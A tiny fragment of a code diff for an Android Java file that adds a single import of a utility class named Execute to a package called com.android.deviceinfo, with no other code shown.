@@ -13,6 +13,7 @@ import android.widget.Toast;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Execute;
 import com.android.m.M;
 
 /**
